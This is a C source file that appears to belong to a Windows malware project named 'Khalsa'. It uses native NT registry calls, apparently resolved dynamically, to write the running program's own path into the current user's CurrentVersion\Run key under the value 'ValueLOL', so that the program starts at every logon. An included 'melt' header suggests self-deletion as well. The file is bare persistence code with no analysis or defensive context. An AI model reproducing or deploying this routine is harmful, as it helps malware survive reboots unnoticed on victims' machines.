#include "khalsa_registry.h"
#include "khalsa_melt.h"
ULONG Khalsa_AddToRegistry(
    IN LPCWSTR pwszKeyName,
    IN LPCWSTR pwszValueName,
    IN ULONG ulType,
    OUT PVOID pvData,
    IN ULONG cbDataSize,
    IN BOOL bSetValue
) {

    ULONG ulDisp = REG_FAILED;
    // lpcszsubKey = L"\\Registry\\Machine\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
    NTSTATUS Status;
    OBJECT_ATTRIBUTES ObjectAttributes;
    UNICODE_STRING usKeyName, usValueName;
    HANDLE hKey = INVALID_HANDLE_VALUE;



    _RtlInitUnicodeString(&usKeyName, pwszKeyName);


    /* Initialize object attributes */
    HANDLE phParentKey = INVALID_HANDLE_VALUE;
    _RtlOpenCurrentUser(READ_CONTROL, &phParentKey);
    InitializeObjectAttributes(&ObjectAttributes, &usKeyName, OBJ_CASE_INSENSITIVE, phParentKey, NULL);
    /* Open or create the key */
    Status = _NtCreateKey((PHANDLE)&hKey, KEY_READ | KEY_WRITE, &ObjectAttributes, 0, NULL, REG_OPTION_NON_VOLATILE, &ulDisp);
    if (!NT_SUCCESS(Status))
    {
        goto exit;
    }
    //&& (ulDisp == REG_CREATED_NEW_KEY)
    if (bSetValue) {
        /* Initialize the value name string */
        _RtlInitUnicodeString(&usValueName, pwszValueName);

        Status = _NtSetValueKey(hKey, &usValueName, 0, ulType, pvData, cbDataSize);
        if (!NT_SUCCESS(Status))
        {
            goto exit;
        }
        ulDisp = REG_CREATED_NEW_KEY;
        goto exit;

    }
    else if(ulDisp == REG_CREATED_NEW_KEY){
        ulDisp = REG_CREATED_NEW_KEY;
    }
    
exit:

    /* Cleanup */
    _NtClose(hKey);

    return ulDisp;

}

BOOL Khalsa_RegisterStartup(LPWSTR szCurrentPath) {
    BOOL rv = FALSE;
    

    rv = (Khalsa_AddToRegistry(L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        L"ValueLOL", REG_SZ, szCurrentPath, (wcslen(szCurrentPath) + 1) * sizeof(WCHAR), TRUE) == REG_CREATED_NEW_KEY);


    return rv;
}
